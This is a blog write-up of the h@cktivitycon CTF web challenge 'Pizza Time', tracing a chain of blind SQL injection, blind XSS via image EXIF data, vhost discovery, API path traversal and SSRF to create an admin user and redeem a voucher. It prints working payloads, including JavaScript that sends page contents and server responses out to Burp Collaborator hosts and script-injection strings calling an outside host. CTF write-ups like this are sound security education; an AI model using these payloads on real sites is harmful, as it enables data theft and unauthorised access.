---
source: zlz-buerhaus
source_url: https://buer.haus/2020/07/31/hcktivitycon-pizza-time-web-750/
title: "h@cktivitycon – Pizza Time (Web 750) | ziot"
---

[< Back](https://buer.haus/)

![](http://buer.haus/wp-content/uploads/2020/07/h1pizzalogo.png)

HackerOne just ran the online h@cktivity con and with it was a CTF. I spent 15 hours solving the big web challenge with the team Hacking for Soju called Pizza Time! This is yet another solid web CTF challenge created by the wizard [Adam Langley](https://twitter.com/adamtlangley).

This is the challenge text that leads you into it:

![](http://buer.haus/wp-content/uploads/2020/07/challenge.png)

The important piece here is that they are intentionally calling out a wildcard scope, so we know it's going to come into play at some point.

```
Scope: *.pizza.hacktivity.h1ctf.com
```

When you go to the website, this is what you see:

[![](http://buer.haus/wp-content/uploads/2020/07/website-1024x736.png)](http://buer.haus/wp-content/uploads/2020/07/website.png)

We can note a few things from initially loading the page:

- There is an API request to /toppings
- There is a flow for ordering a pizza where you select toppings, enter your info, and can put a discount code in.
- There is a support chat bot you can interact with

Going through the order flow, this is what the request looks like:

```
POST /order HTTP/1.1
Host: pizza.hacktivity.h1ctf.com

toppings%5B%5D=1&toppings%5B%5D=3&branch=6649&address%5Bline_1%5D=Test&address%5Bline_2%5D=&address%5Bline_3%5D=&address%5Bcity%5D=Test&address%5Bstate%5D=Test&address%5Bzipcode%5D=00000&email=hidden%40mrzioto.com&discount_code=
```

And this is what you get at the end:

![](http://buer.haus/wp-content/uploads/2020/07/order.png)

The next thing is to look at the support chat bot. After typing a bunch of random strings in, I found that typing "order" finally gave a response.

![](http://buer.haus/wp-content/uploads/2020/07/not-delivered-yet.png)

I played around with a bit, until I noticed this:

![](http://buer.haus/wp-content/uploads/2020/07/sqli.png)

Ahh, a Blind SQL Injection! I spent awhile writing a script to pull data from the database, which I eventually learned after was complete overkill. Here is the Python script I used to explore the schema:

[https://gist.github.com/ziot/32c68da0fe574a25b2adc02d10f86232](https://gist.github.com/ziot/32c68da0fe574a25b2adc02d10f86232)

After running the script for a bit, I ended up with the following:

```
information_schema
h1pizza
    order
        delivered
        hash
        id

id = 1001
hash = aau5....
delivered = 0/1
```

We have a schema h1pizza with the table order. The order table contained id, hash, and delivered. We know that 'hash' is the bit that we receive when we place an order. We know what the bot says when delivered=0, but what about an order with delivered=1? There's one order that has delivered=1 set, the order hash is: ul2hamz1

As a side note here: a lot of effort went into this blind SQLi and pulling the order ID, but literally all you needed to type was:

```
' or delivered='1
```

Either way, this is where it leads you:

![](http://buer.haus/wp-content/uploads/2020/07/claimform.png)

The link leads to a claim form:

[https://pizza.hacktivity.h1ctf.com/claim/47080a17833c6ec2b51ec73d36499b98](https://pizza.hacktivity.h1ctf.com/claim/47080a17833c6ec2b51ec73d36499b98)

This is what it looks like:

![](http://buer.haus/wp-content/uploads/2020/07/claimform2.png)

That red textbox there is a nice little hint for the next step, that I might add, was not there when I first went through it. 😛

There's an attachment form for images and the text basically points towards Blind Cross-Site Scripting via image EXIF data. So we need to grab a valid jpeg image, modify the exif data, and toss our XSS payload in there. A good tool for this is Exif Pilot, but there are a lot of online tools that can do this too.

[![](http://buer.haus/wp-content/uploads/2020/07/exifpilot-1024x590.png)](http://buer.haus/wp-content/uploads/2020/07/exifpilot.png)

When we upload that image, we get a hit from the server:

```
161.35.169.187 - - [30/Jul/2020:06:56:40 +0000] "GET /2 HTTP/1.1" 404 3802 "https://pizza.hacktivity.h1ctf.com/claim-review/19e98182b4adfc213ee70da38094c1fb" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/77.0.3865.90 Safari/537.36"
```

Now we have a new URL, but we can't hit it:

https://pizza.hacktivity.h1ctf.com/claim-review/19e98182b4adfc213ee70da38094c1fb

Next step is to write some JS code to exfil the page contents.

```
window.addEventListener('load', function() {
    var data = btoa(encodeURIComponent(document.documentElement.outerHTML));
    post('http://bixky5wmalssq6ug240ssg2b82eu2j.burpcollaborator.net/', {exfil: data});
}, false);
```

This gives us the following HTML:

[https://gist.github.com/ziot/0863e513844e926decb86965bca557e6](https://gist.github.com/ziot/0863e513844e926decb86965bca557e6)

We can see there is a form for creating a voucher code:

```
                    <form method="post">
                        <div class="alert alert-info text-center">
                            <p>Create a voucher code for a customer refund</p>
                            <p>Enter the amount in pence/cents i.e $10.00 = 1000</p>
                        </div>
                        <div><label>Amount</label></div>
                        <div><input name="voucher_amount" class="form-control"></div>
                        <div style="margin-top:10px"><input type="submit" class="btn btn-success pull-right" value="Create Voucher"></div>
                    </form>
```

`
`

``

And finally, we write some XSS JavaScript code to create our voucher:

```
function getVoucher() {
    var xhr = new XMLHttpRequest();
    xhr.open("POST", window.location.pathname, true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.onreadystatechange = function() {
        if (this.readyState === XMLHttpRequest.DONE) {
            var data = btoa(xhr.responseText);
            var img = new Image();
            img.src = "http://p1rsosy2c18bj7nmdcwd636hs8yymn.burpcollaborator.net/exfil?"+data;
        }
    }
    xhr.send("voucher_amount=20000");
}
```

`
`

``

Now when we refresh the claim page, we see the following:

![](http://buer.haus/wp-content/uploads/2020/07/claimform3.png)

At this point it looks like we are finished with this path. We have a code, but it's not activated yet. The key takeaway from that page is that it says "management" team. That seems like an important term, especially knowing we have a wildcard scope that we haven't explored yet. We can guess that we probably need some sort of management portal to activate our code. From here, we set off to see what else we can find.

Going back to the beginning where it talked about a wildcard scope, we start to mess with the domain. I had no luck bruteforcing for subdomains or finding subdomains via recon/certs. So I decided to explore vhosts a bit. I noticed that when you load the website on port 80 and supply an arbitrary vhost, you get a default nginx page.

[![](http://buer.haus/wp-content/uploads/2020/07/vhost-default-1024x484.png)](http://buer.haus/wp-content/uploads/2020/07/vhost-default.png)

After trying some random keywords, I got a hit with **management**:

[![](http://buer.haus/wp-content/uploads/2020/07/management-1024x212.png)](http://buer.haus/wp-content/uploads/2020/07/management.png)

Management portal response:

[https://gist.github.com/ziot/d83e60d7abd22acb585ea5ac2b3c9cbc](https://gist.github.com/ziot/d83e60d7abd22acb585ea5ac2b3c9cbc)

Unfortunately, we need a login to proceed:

```
            <form method="post">
                <div class="panel panel-default">
                    <div class="panel-heading">Login</div>
                    <div class="panel-body">
                        <div><label>Username:</label></div>
                        <div><input class="form-control" name="username"></div>
                        <div style="margin-top:7px"><label>Password:</label></div>
                        <div><input type="password" class="form-control" name="password"></div>
                        <div style="margin-top:11px"><input type="submit" class="btn btn-success pull-right" value="Login"> </div>
                    </div>
                </div>
            </form>
```

So now we made some progress, but we gotta go back to the main site. I decided this time to play with the toppings endpoint due to it having this in the response:

GET /toppings HTTP/1.1

Host: pizza.hacktivity.h1ctf.com

```
"methods":{"GET":{"Description":"Get available pizza toppings","arguments":[]}}}
```

Playing around with it, I finally found this:

GET /toppings/1 HTTP/1.1

Host: pizza.hacktivity.h1ctf.com

```
["Endpoint \"\/api\/toppings\/1\" not found"]
```

So we have a /api/ endpoint that we can't access, perhaps we need some sort of relative path traversal here. Trying basic payloads such as ../, %2e%2e%2f, etc all seem to fail though. After a bit of effort, I finally managed to get it to work:

GET /toppings/%2e%2e%2e%2e%2f%5c%2f HTTP/1.1

```
<[\
  "Endpoint \"/api/\" not found"\
]
```

So we need users, we try the obvious:

GET /toppings/%2e%2e%2e%2e%2f%5c%2fusers HTTP/1.1

Host: pizza.hacktivity.h1ctf.com

```
{
  "data": [\
    {\
      "id": 1,\
      "username": "admin"\
    }\
  ],
  "methods": {
    "GET": {
      "Description": "List all admin/management users",
      "arguments": []
    },
    "POST": {
      "Description": "Create a new admin/management user",
      "arguments": {
        "email": "Email address of new user"
      }
    }
  }
}
```

But when we try to make a POST request to create a new user, we get the following error:

<head><title>403 Forbidden</title></head>

There was something I noticed earlier on but for simplicity in the walkthrough I didn't want to bring up until now. In the order flow, there is also a Server-Side Request Forgery. So going back to the order flow, the request looks like this:

```
POST /order HTTP/1.1
Host: pizza.hacktivity.h1ctf.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 797
Origin: https://pizza.hacktivity.h1ctf.com
Connection: close
Referer: https://pizza.hacktivity.h1ctf.com/
Cookie: session=e491ddbe676f7b4c7972b94d92c54cf8

toppings%5B%5D=1&toppings%5B%5D=3&toppings%5B%5D=5&test=test&address%5Bline_1%5D=test'%3B%22%3E%3Cscript+src%3Dhttps%3A%2F%2Fziot2.xss.ht%3E%3C%2Fscript%3E&address%5Bline_2%5D=test'%3B%22%3E%3Cscript+src%3Dhttps%3A%2F%2Fziot2.xss.ht%3E%3C%2Fscript%3E&address%5Bline_3%5D=test'%3B%22%3E%3Cscript+src%3Dhttps%3A%2F%2Fziot2.xss.ht%3E%3C%2Fscript%3E&address%5Bcity%5D=test'%3B%22%3E%3Cscript+src%3Dhttps%3A%2F%2Fziot2.xss.ht%3E%3C%2Fscript%3E&address%5Bstate%5D=test'%3B%22%3E%3Cscript+src%3Dhttps%3A%2F%2Fziot2.xss.ht%3E%3C%2Fscript%3E&address%5Bzipcode%5D=test'%3B%22%3E%3Cscript+src%3Dhttps%3A%2F%2Fziot2.xss.ht%3E%3C%2Fscript%3E&email=ziot%40wearehackerone.com&discount_code=&branch=1748
```

After fuzzing around the params a bit, I found the following error:

[![](http://buer.haus/wp-content/uploads/2020/07/ssrf-error-1024x345.png)](http://buer.haus/wp-content/uploads/2020/07/ssrf-error.png)

So we can see that the branch parameter is vulnerable to SSRF. After playing around with it a bit, we finally get a full response:

```
&branch=1748.branch.internal.pizza.hacktivity.h1ctf.com@xss.buer.haus/?%23
```

```
{"success":false,"screen_msg":"Invalid Response from remote server","error_msg":"Remote Response: <!DOCTYPE HTML PUBLIC \"-\/\/IETF\/\/DTD HTML 2.0\/\/EN\">\n<html><head>\n<title>302 Found<\/title>\n<\/head><body>\n<h1>Found<\/h1>\n<p>The document has moved <a href=\"https:\/\/xss.buer.haus\/?\">here<\/a>.<\/p>\n<hr>\n<address>Apache\/2.4.29 (Ubuntu) Server at xss.buer.haus Port 80<\/address>\n<\/body><\/html>\n"}
```

A key point in this is that it is making a POST request with the parameters you're sending. This can be seen as a sort of "micro API service" that is forward proxying your request. With that said, it does seem to only send specific parameters through, so you can't force anything new into the POST request data itself. HOWEVER, we know that creating a new user via the API only requires the email parameter which is also present in this post request.

The problems we have right here though are the following:

- This SSRF does not follow 302 redirects
- This is HTTP only, we can't hit the create user API because it is SSL/443.

After trying a bunch of different things, eventually we had some new progress. Sending a ?debug= param to the users API, we get new information:

GET /toppings/%2e%2e%2e%2e%2f%5c%2fusers?debug=true HTTP/1.1

Host: pizza.hacktivity.h1ctf.com

```
  "debug": {
    "server": "192.168.20.3",
    "port": "80",
    "status": "up"
  }
```

So now we sent that through the order SSRF with that server and api path.

[![](http://buer.haus/wp-content/uploads/2020/07/create-user-1024x274.png)](http://buer.haus/wp-content/uploads/2020/07/create-user.png)

Now we have credentials to log into the admin panel.

[![](http://buer.haus/wp-content/uploads/2020/07/management-login-1024x245.png)](http://buer.haus/wp-content/uploads/2020/07/management-login.png)

The portal looks like this:

![](http://buer.haus/wp-content/uploads/2020/07/voucher.png)

Source:

[https://gist.github.com/ziot/477360cca30e1796b81eb0856215f2b7](https://gist.github.com/ziot/477360cca30e1796b81eb0856215f2b7)

So we send a POST request for our voucher to activate it. Then we go through the order flow and put the voucher code in where the discount field is before completing the order.

![](http://buer.haus/wp-content/uploads/2020/07/unknown.png)

Boom! And there's the flag.

Some small shouts:

- Thanks to HackerOne and nahamsecfor putting on a great con
- John Hammond for putting on another great CTF
- Adam Langley for creating yet another super solid web challenge
- xEHLE, smiegles, samerbby, lefevre, and a few others for following along and giving me advice when I kept getting stuck